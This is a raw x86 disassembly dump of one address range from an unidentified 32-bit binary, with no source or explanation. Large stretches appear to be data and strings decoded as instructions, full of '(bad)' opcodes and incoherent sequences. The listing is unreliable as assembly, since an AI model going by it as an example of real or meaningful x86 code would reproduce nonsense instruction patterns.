  433261:	inc    ebp
  433262:	mov    DWORD PTR [ebx],esi
  433264:	fadd   QWORD PTR [ebx]
  433266:	dec    ebp
  433267:	push   eax
  433268:	xor    eax,DWORD PTR [ebp+0x3]
  43326b:	push   eax
  43326c:	mov    DWORD PTR [eax+ebx*8],ebx
  43326f:	push   esi
  433271:	mov    eax,DWORD PTR [eax]
  433273:	lock cmp eax,0xf84e85c0
  433279:	inc    ebp
  43327a:	test   BYTE PTR [ebx],dh
  43327c:	add    DWORD PTR [ebx],eax
  43327e:	add    BYTE PTR [eax+0x4d],dl
  433281:	jne    0x4332b6
  433283:	lea    ecx,[ebx-0x7617fc44]
  433289:	div    ah
  43328b:	inc    DWORD PTR [ebp+0x45]
  43328e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433294:	jb     0x433221
  433296:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43329d:	mov    ecx,DWORD PTR [ebp-0x10]
  4332a0:	xor    ecx,DWORD PTR [ebp+0x3]
  4332a3:	mov    edi,DWORD PTR [ebx]
  4332a5:	adc    BYTE PTR [ebp+0x41],dh
  4332a8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4332ae:	ret    
  4332af:	push   ss
  4332b0:	push   0x45
  4332b2:	lea    ecx,[ebx+0x4de80cb0]
  4332b8:	sti    
  4332b9:	add    edi,edi
  4332bb:	or     BYTE PTR [ebp+0x4d],al
  4332be:	mov    ebp,DWORD PTR [ebx]
  4332c0:	xor    ebp,ecx
  4332c2:	mov    al,BYTE PTR [edx]
  4332c4:	add    eax,0xc7200
  4332c9:	jne    0x433318
  4332cb:	lea    esi,[ebx]
  4332cd:	mov    al,0xf
  4332cf:	call   0xf2994
  4332d4:	shl    DWORD PTR [ecx],0x84
  4332d7:	pushf  
  4332d8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332de:	mov    esi,DWORD PTR [edx]
  4332e0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332e7:	test   DWORD PTR [eax],eax
  4332e9:	clc    
  4332ea:	dec    ebp
  4332eb:	inc    ebp
  4332ec:	xor    edi,DWORD PTR [edi+ecx*1]
  4332ef:	pushf  
  4332f0:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332f7:	lea    eax,[ecx]
  4332f9:	int3   
  4332fa:	add    BYTE PTR [ebp+0x45],cl
  4332fd:	lea    ecx,[ebx-0x75b2cc38]
  433303:	lea    eax,ds:0x4d72c4
  433309:	mov    ecx,DWORD PTR [ebp-0x4]
  43330c:	xor    ecx,edi
  43330e:	bswap  ebx
  433310:	ror    BYTE PTR [ebp-0x35],0xe9
  433314:	rol    DWORD PTR [ecx],0x84
  433317:	add    BYTE PTR [ecx],al
  433319:	xor    eax,DWORD PTR [eax]
  43331b:	pushf  
  43331c:	inc    ebp
  43331d:	jnp    0x8a436720
  433323:	mov    eax,DWORD PTR ds:0xcf72e8
  433329:	lock dec ebp
  43332b:	retf   
  43332c:	xor    ecx,DWORD PTR [ebp+0xf]
  43332f:	mov    eax,eax
  433331:	fmul   st,st(3)
  433333:	test   ecx,0x19b8484
  433339:	xor    al,BYTE PTR [eax]
  43333b:	mov    DWORD PTR [ebp-0x28],eax
  43333e:	mov    eax,DWORD PTR [ebp+0x33]
  433341:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433347:	ret    
  433348:	add    al,cl
  43334a:	dec    ebp
  43334b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433351:	add    ecx,DWORD PTR ds:0xc7250
  433357:	inc    ebp
  433358:	rcl    DWORD PTR [eax+0x4d],0x2b
  43335c:	mov    edi,edi
  43335e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433364:	jb     0x43332d
  433366:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  43336d:	mov    esi,DWORD PTR [ebx]
  43336f:	cld    
  433370:	mov    cl,bh
  433372:	or     eax,0x372b6
  433377:	cmp    ecx,eax
  433379:	jne    0x4333f6
  43337f:	mov    eax,DWORD PTR [ebp-0x20]
  433382:	mov    eax,DWORD PTR [eax]
  433384:	xor    eax,edi
  433386:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  43338d:	mov    ecx,DWORD PTR [ebp-0x4]
  433390:	mov    ecx,edi
  433392:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433398:	jb     0x4333a9
  43339a:	add    BYTE PTR [edi-0x3f],dl
  43339d:	add    BYTE PTR [ebp-0x75],cl
  4333a0:	mov    esi,eax
  4333a2:	xor    eax,DWORD PTR [eax]
  4333a4:	mov    al,bh
  4333a6:	or     eax,0x4b7284
  4333ab:	xor    al,cl
  4333ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4333b0:	mov    ecx,edi
  4333b2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333b8:	jb     0x4333c9
  4333ba:	add    BYTE PTR [edi],dh
  4333bc:	enter  0x8500,0x8b
  4333c0:	add    ah,bl
  4333c2:	add    BYTE PTR [eax],al
  4333c4:	inc    ebp
  4333c5:	(bad)  
  4333c6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333cd:	mov    esi,DWORD PTR [edx-0x4]
  4333d0:	add    bh,cl
  4333d2:	dec    ebp
  4333d3:	mov    dh,0x8b
  4333d5:	add    esi,DWORD PTR [ebx]
  4333d7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333dd:	add    BYTE PTR [eax],al
  4333df:	mov    eax,ecx
  4333e1:	loopne 0x433430
  4333e3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333e9:	dec    ebx
  4333ea:	or     eax,0x8b7232
  4333ef:	in     al,0xc1
  4333f1:	or     DWORD PTR [ebp-0x31],ecx
  4333f4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333fb:	xor    dh,BYTE PTR [edx-0x75]
  4333fe:	add    al,dh
  433400:	enter  0x4f09,0xcf
  433404:	inc    ebp
  433405:	mov    WORD PTR [ebx-0x75cdccb5],cs
  43340b:	or     al,BYTE PTR ds:0xe4728b
  433411:	or     DWORD PTR [ebp-0x31],ecx
  433414:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  43341b:	cmp    dh,BYTE PTR [edx+0xf]
  43341e:	add    bl,dl
  433420:	rol    DWORD PTR [eax],0x4d
  433423:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433429:	(bad)  
  43342a:	or     eax,0x4b7284
  43342f:	xor    al,cl
  433431:	mov    ecx,DWORD PTR [ebp-0x20]
  433434:	mov    ecx,DWORD PTR [ecx]
  433436:	xor    ecx,edi
  433438:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43343f:	xor    cl,al
  433441:	mov    ecx,DWORD PTR [edi]
  433443:	fadd   QWORD PTR [ebp+0x9]
  433446:	call   0xffd02f1a
  43344b:	dec    ebx
  43344c:	dec    ebp
  43344d:	xor    bh,BYTE PTR [ebx]
  43344f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433453:	loopne 0x433451
  433455:	or     edi,eax
  433457:	iret   
  433458:	ret    
  433459:	mov    WORD PTR [ebp+0x4f],es
  43345c:	mov    esi,DWORD PTR [edx]
  43345e:	call   0x8452fb9d
  433463:	(bad)  
  433464:	fwait
  433465:	add    BYTE PTR [edx],dh
  433467:	mov    esi,DWORD PTR [ebx]
  433469:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43346f:	test   BYTE PTR [ebx],dh
  433471:	dec    ebx
  433472:	add    esi,DWORD PTR [edx]
  433474:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43347a:	dec    edi
  43347c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  433483:	xor    al,BYTE PTR [ebx]
  433485:	mov    edi,DWORD PTR [ebx]
  433487:	in     al,0x75
  433489:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43348f:	dec    ebx
  433490:	xor    esi,DWORD PTR [edx]
  433492:	lea    ecx,[edx]
  433494:	or     BYTE PTR [ebx+0x900f072],cl
  43349a:	ja     0x43346b
  43349c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  4334a3:	cmp    ch,al
  4334a5:	jne    0x43349a
  4334a7:	mov    edi,edi
  4334a9:	fadd   QWORD PTR [ebp+0x0]
  4334ac:	mov    eax,edi
  4334ae:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334b5:	mov    edx,DWORD PTR [ebx]
  4334b7:	in     al,0x45
  4334b9:	or     DWORD PTR [ebx],esi
  4334bb:	iret   
  4334bc:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334c3:	xor    dl,BYTE PTR [eax-0x75]
  4334c6:	sbb    al,0xe0
  4334c8:	dec    DWORD PTR [ecx]
  4334ca:	mov    ecx,edi
  4334cc:	in     al,dx
  4334cd:	mov    eax,es
  4334cf:	dec    ebx
  4334d0:	mov    DWORD PTR [edx],esi
  4334d2:	fmul   QWORD PTR [edx]
  4334d4:	jne    0x433461
  4334d6:	(bad)  
  4334d7:	(bad)  
  4334d9:	or     DWORD PTR [ebp-0x31],eax
  4334dc:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334e3:	cmp    bh,bh
  4334e5:	jne    0x43352c
  4334e7:	lea    ecx,[ebx-0x38372750]
  4334ed:	inc    ebx
  4334ef:	mov    eax,ecx
  4334f1:	mov    eax,0xa00c111
  4334f6:	jne    0x43353d
  4334f8:	mov    esi,DWORD PTR [ebx]
  4334fa:	test   al,0x3
  4334fc:	inc    ebp
  4334fd:	mov    DWORD PTR [eax-0xc],edx
  433500:	loop   0x433547
  433502:	push   DWORD PTR [ebx]
  433504:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43350a:	add    DWORD PTR [eax],eax
  43350c:	mov    eax,edi
  43350e:	lods   al,BYTE PTR ds:[esi]
  43350f:	dec    ebp
  433510:	inc    ebp
  433511:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433517:	retf   
  433518:	mov    edx,ecx
  43351a:	adc    al,0x84
  43351c:	(bad)  
  43351d:	std    
  43351e:	ret    
  43351f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433525:	hlt    
  433526:	rol    edi,0x82
  433529:	ret    
  43352a:	cld    
  43352b:	enter  0x11ff,0x45
  43352f:	inc    ebp
  433530:	pop    edi
  433531:	mov    ebx,DWORD PTR [ebx+0x14]
  433534:	ret    0xc7
  433537:	test   BYTE PTR [ebx+0x4532519b],cl
  43353d:	jmp    0x4334ca
  43353f:	push   0x8
  433541:	call   DWORD PTR [esi]
  433543:	in     al,dx
  433544:	add    BYTE PTR [ebp+0x1],0x50
  433548:	add    bh,ah
  43354a:	add    bh,bh
  43354c:	icebp  
  43354d:	mov    ecx,DWORD PTR [eax]
  43354f:	cld    
  433550:	pop    es
  433551:	dec    ebp
  433552:	shl    DWORD PTR [ebx],0x72
  433555:	add    eax,DWORD PTR [eax]
  433557:	cmp    edx,ecx
  433559:	je     0x43356b
  43355b:	mov    esi,DWORD PTR [ebp-0x4]
  43355e:	inc    edi
  433560:	or     al,0xc3
  433562:	jmp    FWORD PTR [edx-0x18]
  433565:	(bad)  
  433566:	sti    
  433567:	cwde   
  433568:	(bad)  
  433569:	call   0xffa12e74
  43356e:	or     al,0x45
  433570:	push   ebp
  433571:	sub    esp,0x18
  433574:	push   ebx
  433575:	inc    ebp
  433576:	mov    edi,edi
  433578:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43357f:	test   al,0x54
  433581:	inc    ebp
  433582:	push   ecx
  433583:	push   eax
  433584:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43358a:	add    ah,bh
  43358c:	(bad)  
  43358d:	dec    ebp
  43358e:	add    DWORD PTR [ebx],esi
  433590:	inc    ebp
  433591:	add    ecx,DWORD PTR [ebx+0x74943b]
  433597:	push   0xffffff8b
  433599:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43359f:	add    eax,DWORD PTR [ecx]
  4335a1:	or     BYTE PTR [eax],al
  4335a3:	call   0xff852da8
  4335a8:	mov    eax,DWORD PTR [ebp+0x14]
  4335ab:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4335b1:	inc    ebp
  4335b2:	dec    ecx
  4335b3:	add    ebp,DWORD PTR [edx+0x14]
  4335b6:	push   0x8b3045
  4335bb:	call   0x33ad8330
  4335c0:	inc    DWORD PTR [ebx]
  4335c2:	mov    DWORD PTR [edi],ecx
  4335c4:	mov    eax,ecx
  4335c6:	or     BYTE PTR [ebp-0x3d],cl
  4335c9:	cmp    eax,edi
  4335cb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335d0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335d6:	adc    al,0xc9
  4335d8:	inc    ebp
  4335d9:	adc    BYTE PTR [eax+0x55],dl
  4335dc:	jne    0x4335ca
  4335de:	call   0xff54356e
  4335e3:	dec    ebp
  4335e4:	inc    ebp
  4335e5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335eb:	add    BYTE PTR [ebx],bh
  4335ed:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335f1:	push   esp
  4335f2:	or     al,0x51
  4335f4:	dec    ebp
  4335f5:	xor    DWORD PTR [ebx],0xf32039b
  4335fb:	cmp    eax,DWORD PTR [ebp+0x74]
  4335fe:	mov    edi,edi
  433600:	pop    edi
  433601:	adc    BYTE PTR [ebx+0x75],bl
  433604:	ret    0x50
  433607:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43360b:	(bad)  
  43360c:	clc    
  43360d:	mov    esp,ebp
  43360f:	pop    ecx
  433610:	mov    ecx,0xf80085c2
  433615:	mov    ecx,DWORD PTR [ecx+edx*2]
  433618:	push   esi
  433619:	push   esi
  43361a:	(bad)  
  43361b:	lock add DWORD PTR [ebp+0x44],eax
  43361f:	mov    edx,DWORD PTR [eax]
  433621:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433625:	or     BYTE PTR [edi+eax*1+0x51],dl
  433629:	ret    
  43362a:	xor    ebx,DWORD PTR [ebx+0x37232be]
  433630:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433636:	or     al,0x80
  433638:	jge    0x43363b
  43363a:	mov    DWORD PTR [eax],eax
  43363c:	and    al,0x8
  43363e:	cmp    DWORD PTR [ebp+0x10],eax
  433641:	mov    edx,DWORD PTR [esi]
  433643:	xchg   esp,eax
  433644:	dec    esp
  433645:	add    BYTE PTR [eax],dl
  433647:	mov    ecx,edx
  433649:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43364d:	dec    ebp
  43364e:	into   
  43364f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433655:	mov    edx,DWORD PTR [eax+0x14]
  433658:	das    
  433659:	add    al,0x45
  43365b:	add    BYTE PTR [ebp+0x0],dh
  43365e:	mov    edi,edi
  433660:	and    al,0x50
  433662:	mov    eax,DWORD PTR [eax]
  433664:	and    al,0xd1
  433666:	xor    eax,DWORD PTR [esi]
  433668:	lea    eax,[ebp+0x8]
  43366b:	xor    esi,DWORD PTR [edx+0x3]
  43366e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433674:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43367a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433684:	cmp    al,0xff
  433686:	pushf  
  433687:	mov    edi,edi
  433689:	or     BYTE PTR [esi+ecx*1],cl
  43368c:	jne    0x433651
  43368e:	call   0xc365a
  433693:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433697:	mov    ebx,DWORD PTR [eax]
  433699:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43369d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4336a5:	pop    esi
  4336a6:	and    al,0xc9
  4336a8:	call   DWORD PTR [eax]
  4336aa:	and    al,0x55
  4336ac:	call   0x28359d
  4336b1:	add    DWORD PTR [eax+edx*1+0xc],0x31
  4336b6:	clc    
  4336b7:	pushf  
  4336b8:	dec    DWORD PTR [ecx+0x57892474]
  4336be:	jmp    0x433701
  4336c0:	and    al,0x89
  4336c2:	and    al,0x24
  4336c4:	or     BYTE PTR [ebx-0x45ebdbe8],cl
  4336ca:	dec    DWORD PTR [eax]
  4336cc:	and    al,0x7
  4336ce:	pop    esi
  4336cf:	cli    
  4336d0:	in     eax,0x9b
  4336d2:	ret    0x32
  4336d5:	add    eax,edx
  4336d7:	mov    DWORD PTR [ebx+0x688b8924],ebx
  4336dd:	or     al,0xf8
  4336df:	jl     0x43375e
  4336e1:	adc    al,0x9c
  4336e3:	dec    ebp
  4336e4:	push   0xff8b7575
  4336e9:	and    al,0xff
  4336eb:	xor    edi,edi
  4336ed:	mov    esi,DWORD PTR [esp-0x75]
  4336f1:	add    ecx,DWORD PTR [ebx+0x4cca0c0f]
  4336f7:	or     bl,ch
  4336f9:	cmp    DWORD PTR [eax],edx
  4336fb:	sbb    al,0x44
  4336fd:	or     BYTE PTR [eax+edx*1-0x7c],cl
  433701:	xor    ah,BYTE PTR [eax*4-0x7a8accf2]
  433708:	or     BYTE PTR [ecx*4+0x5d5fbf74],ah
  43370f:	test   eax,0x83001010
  433714:	dec    eax
  433715:	adc    BYTE PTR [eax],al
  433717:	adc    edi,DWORD PTR [edx+0x10]
  43371a:	add    cl,bh
  43371c:	jae    0x43372e
  43371e:	add    BYTE PTR [ebx-0x4bffefb4],dh
  433724:	pop    eax
  433725:	adc    BYTE PTR [eax],al
  433727:	fidiv  DWORD PTR [ebp+0x10]
  43372a:	add    dh,bl
  43372c:	movups xmm0,XMMWORD PTR [eax]
  43372f:	popf   
  433730:	push   cs
  433731:	adc    BYTE PTR [eax],al
  433733:	ins    DWORD PTR es:[edi],dx
  433734:	or     BYTE PTR [eax],dl
  433736:	add    BYTE PTR [ebx+eiz*2+0x370f0010],cl
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [edi],ah
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [ebx],ch
  433758:	aaa    
  433759:	inc    ebx
  43375a:	add    BYTE PTR [edi],ch
  43375c:	aaa    
  43375d:	inc    ebx
  43375e:	add    BYTE PTR [ebx],dh
  433760:	aaa    
  433761:	inc    ebx
  433762:	add    BYTE PTR [edi],dh
  433764:	aaa    
  433765:	inc    ebx
  433766:	add    BYTE PTR [ebx-0x73ffefdd],bh
  43376c:	cmp    al,0x10
  43376e:	add    BYTE PTR [ebx+0x30],cl
  433771:	adc    BYTE PTR [eax],al
  433773:	sub    al,0xc
  433775:	adc    BYTE PTR [eax],al
  433777:	push   ds
  433778:	adc    BYTE PTR ds:[eax],al
  43377b:	mov    bh,0x56
  43377d:	adc    BYTE PTR [eax],al
  43377f:	adc    eax,DWORD PTR [eax+edx*1+0x0]
  433783:	cmp    al,0x4f
  433785:	adc    BYTE PTR [eax],al
  433787:	addr16 aaa 
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebx+0x37],dh
  433795:	inc    ebx
  433796:	add    BYTE PTR [edi+0x37],dh
  433799:	inc    ebx
  43379a:	add    BYTE PTR [ebx+0x37],bh
  43379d:	inc    ebx
  43379e:	add    BYTE PTR [edi+0x37],bh
  4337a1:	inc    ebx
  4337a2:	add    BYTE PTR [ebx-0x23ffbcc9],al
  4337a8:	pop    esp
  4337a9:	adc    BYTE PTR [eax],al
  4337ab:	jle    0x4337cd
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	cld    
  4337b0:	dec    edx
  4337b1:	adc    BYTE PTR [eax],al
  4337b3:	add    al,0xb
  4337b5:	adc    BYTE PTR [eax],al
  4337b7:	push   ebx
  4337b8:	ins    DWORD PTR es:[edi],dx
  4337b9:	adc    BYTE PTR [eax],al
  4337bb:	fs jl  0x4337ce
  4337be:	add    BYTE PTR [edx+0x42001015],ah
  4337c4:	jge    0x4337d6
  4337c6:	add    BYTE PTR [edi-0x54ffbcc9],ah
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [edi-0x4cffbcc9],ch
  4337d4:	aaa    
  4337d5:	inc    ebx
  4337d6:	add    BYTE PTR [edi-0x44ffbcc9],dh
  4337dc:	aaa    
  4337dd:	inc    ebx
  4337de:	add    BYTE PTR [edi-0x3cffbcc9],bh
  4337e4:	aaa    
  4337e5:	inc    ebx
  4337e6:	add    BYTE PTR [edi+0x2300103a],ah
  4337ec:	aas    
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jne    0x4337fc
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	fldenv [esi]
  4337f5:	adc    BYTE PTR [eax],al
  4337f7:	xchg   esp,eax
  4337f8:	push   0x10
  4337fa:	add    bl,ah
  4337fc:	pop    eax
  4337fd:	adc    BYTE PTR [eax],al
  4337ff:	in     al,0x2f
  433801:	adc    BYTE PTR [eax],al
  433803:	leave  
  433804:	sbb    DWORD PTR [eax],edx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    bl,dh
  433814:	aaa    
  433815:	inc    ebx
  433816:	add    bh,dh
  433818:	aaa    
  433819:	inc    ebx
  43381a:	add    bl,bh
  43381c:	aaa    
  43381d:	inc    ebx
  43381e:	add    bh,bh
  433820:	aaa    
  433821:	inc    ebx
  433822:	add    BYTE PTR [ebx],al
  433824:	cmp    BYTE PTR [ebx+0x0],al
  433827:	mov    ebp,0x1d001062
  43382c:	adc    BYTE PTR [eax],dl
  43382e:	add    BYTE PTR [edi+0x51],dl
  433831:	adc    BYTE PTR [eax],al
  433833:	dec    eax
  433834:	ins    DWORD PTR es:[edi],dx
  433835:	adc    BYTE PTR [eax],al
  433837:	mov    eax,DWORD PTR [edi]
  433839:	adc    BYTE PTR [eax],al
  43383b:	mov    ah,0x7
  43383d:	adc    BYTE PTR [eax],al
  43383f:	ror    DWORD PTR [esi],1
  433841:	adc    BYTE PTR [eax],al
  433843:	pop    edi
  433844:	inc    ebp
  433845:	adc    BYTE PTR [eax],al
  433847:	daa    
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	xor    edi,DWORD PTR [eax]
  433855:	inc    ebx
  433856:	add    BYTE PTR [edi],dh
  433858:	cmp    BYTE PTR [ebx+0x0],al
  43385b:	cmp    edi,DWORD PTR [eax]
  43385d:	inc    ebx
  43385e:	add    BYTE PTR [edi],bh
  433860:	cmp    BYTE PTR [ebx+0x0],al
  433863:	inc    ebx
  433864:	cmp    BYTE PTR [ebx+0x0],al
  433867:	dec    ecx
  433868:	ss push eax
  43386a:	pop    edi
  43386b:	ss inc ebx
  43386d:	ss pop edx
  43386f:	xor    ebx,DWORD PTR [edi+0x52]
  433872:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433876:	pop    edi
  433877:	dec    esi
  433878:	dec    esp
  433879:	dec    eax
  43387a:	xor    esi,DWORD PTR [edx]
  43387c:	pop    edi
  43387d:	xor    al,0x4b
  43387f:	add    BYTE PTR [eax+0x49],cl
  433882:	push   ebp
  433883:	xor    al,0x5f
  433885:	dec    esp
  433886:	inc    edx
  433887:	dec    ecx
  433888:	cmp    DWORD PTR [edi+ebx*2],esi
  43388b:	pop    ecx
  43388c:	inc    edi
  43388d:	add    BYTE PTR [eax+0x50],bl
  433890:	dec    eax
  433891:	pop    edi
  433892:	push   ebp
  433893:	push   ecx
  433894:	inc    edi
  433895:	xor    cl,BYTE PTR [edx+0x38]
  433898:	push   esi
  433899:	add    BYTE PTR [ebx+0x4a],al
  43389c:	push   edx
  43389d:	pop    edi
  43389e:	dec    edi
  43389f:	dec    eax
  4338a0:	dec    edi
  4338a1:	dec    edi
  4338a2:	dec    edx
  4338a3:	add    BYTE PTR [ecx+0x52],al
  4338a6:	cmp    DWORD PTR [edi+0x56],ebx
  4338a9:	aaa    
  4338aa:	dec    esp
  4338ab:	cmp    DWORD PTR [ebx+0x5f],eax
  4338ae:	push   edx
  4338af:	inc    esp
  4338b0:	add    BYTE PTR [ecx+0x37],bl
  4338b3:	inc    esp
  4338b4:	pop    edi
  4338b5:	dec    ecx
  4338b6:	xor    esi,DWORD PTR [edi]
  4338b8:	xor    DWORD PTR [edi+0x49],ebx
  4338bb:	push   esp
  4338bc:	xor    eax,DWORD PTR [eax]
  4338be:	push   edx
  4338bf:	xor    BYTE PTR [eax+0x5f],bl
  4338c2:	dec    eax
  4338c3:	push   edi
  4338c4:	inc    esi
  4338c5:	xor    DWORD PTR [edi+0x5f],edx
  4338c8:	cmp    BYTE PTR [ebx+0x37],dl
  4338cb:	add    BYTE PTR [esi+0x42],dl
  4338ce:	dec    ecx
  4338cf:	xor    ebx,DWORD PTR [edi+0x45]
  4338d2:	xor    BYTE PTR [ebp+0x5f],cl
  4338d5:	xor    al,0x34
  4338d7:	xor    BYTE PTR [edx+0x5f],cl
  4338da:	inc    edi
  4338db:	add    BYTE PTR [edx+0x57],dl
  4338de:	xor    ebx,DWORD PTR [edi+0x31]
  4338e1:	dec    edx
  4338e2:	push   edi
  4338e3:	xor    eax,0x4d435f
  4338e8:	dec    ecx
  4338e9:	xor    eax,0x36365f39
  4338ee:	dec    eax
  4338ef:	xor    BYTE PTR [eax],al
  4338f1:	dec    edi
  4338f2:	inc    ebx
  4338f3:	push   edi
  4338f4:	pop    edi
  4338f5:	inc    edi
  4338f6:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4338fb:	add    BYTE PTR [edx+0x0],al
  4338fe:	pop    eax
  4338ff:	add    BYTE PTR [edi+0x0],al
  433902:	add    BYTE PTR ss:[edi+0x0],bl
  433906:	push   esi
  433907:	add    BYTE PTR [ebx+0x0],al
  43390a:	dec    esi
  43390b:	add    BYTE PTR [eax+eax*1+0x0],al
  43390f:	add    BYTE PTR [edi+0x0],cl
  433912:	dec    ebp
  433913:	add    BYTE PTR [edi+0x0],al
  433916:	xor    eax,DWORD PTR [eax]
  433918:	pop    edi
  433919:	add    BYTE PTR [eax+eax*1],dh
  43391c:	dec    esi
  43391d:	add    BYTE PTR [edx+0x0],bl
  433920:	cmp    BYTE PTR [eax],al
  433922:	pop    edi
  433923:	add    BYTE PTR [eax+0x0],bl
  433926:	cmp    BYTE PTR [eax],al
  433928:	add    BYTE PTR [eax],al
  43392a:	push   edx
  43392b:	add    BYTE PTR [eax+0x0],bl
  43392e:	push   ecx
  43392f:	add    BYTE PTR [edi+0x0],bl
  433932:	dec    esp
  433933:	add    BYTE PTR [edx+0x0],dl
  433936:	dec    ecx
  433937:	add    BYTE PTR [edi+0x0],cl
  43393a:	inc    esp
  43393b:	add    BYTE PTR [edi+0x0],bl
  43393e:	dec    edi
  43393f:	add    BYTE PTR [ebx],dh
  433941:	add    BYTE PTR [eax+eax*1+0x0],al
  433945:	add    BYTE PTR [ebx+0x0],al
  433948:	push   eax
  433949:	add    BYTE PTR [ebp+0x0],al
  43394c:	pop    edi
  43394d:	add    BYTE PTR ds:0x39004500,dh
  433953:	add    BYTE PTR [edi+0x0],bl
  433956:	push   esi
  433957:	add    BYTE PTR [eax],al
  433959:	add    BYTE PTR [edi+0x0],al
  43395c:	dec    esi
  43395d:	add    BYTE PTR [esi+0x0],dl
  433960:	pop    edi
  433961:	add    BYTE PTR [edi+0x0],al
  433964:	push   esp
  433965:	add    BYTE PTR [eax+0x0],cl
  433968:	xor    al,BYTE PTR [eax]
  43396a:	xor    DWORD PTR [eax],eax
  43396c:	pop    edi
  43396d:	add    BYTE PTR [edi+0x0],cl
  433970:	add    BYTE PTR ss:[ebx],dh
  433973:	add    BYTE PTR [eax],al
  433975:	add    BYTE PTR [eax+eax*1+0x45],al
  433979:	add    BYTE PTR [ecx+0x0],cl
  43397c:	pop    edi
  43397d:	add    BYTE PTR [edx+0x0],dl
  433980:	dec    eax
  433981:	add    BYTE PTR [eax+eax*1],dh
  433984:	dec    eax
  433985:	add    BYTE PTR [eax],al
  433987:	add    BYTE PTR [eax],al
  433989:	push   edx
  43398a:	push   ebx
  43398b:	inc    esp
  43398c:	push   ebx
  43398d:	and    esp,DWORD PTR [ebx]
  43398f:	inc    edx
  433990:	xchg   esp,eax
  433991:	or     BYTE PTR [ebp+0x3e],bh
  433994:	inc    ecx
  433995:	mov    bh,0x7d
  433997:	out    0xa6,al
  433999:	cmp    al,0x56
  43399b:	or     BYTE PTR [eax],ah
  43399d:	push   cs
  43399e:	add    BYTE PTR [eax],al
  4339a0:	add    BYTE PTR [ecx+0x3a],dl
  4339a3:	pop    esp
  4339a4:	js     0x4339fe
  4339a6:	ins    DWORD PTR es:[edi],dx
  4339a7:	arpl   WORD PTR [esi+0x76],sp
  4339aa:	addr16 jp 0x433a21
  4339ad:	pop    esp
  4339ae:	inc    ebp
  4339af:	inc    esi
  4339b0:	dec    edx
  4339b1:	bound  ebp,QWORD PTR [edx+0x67]
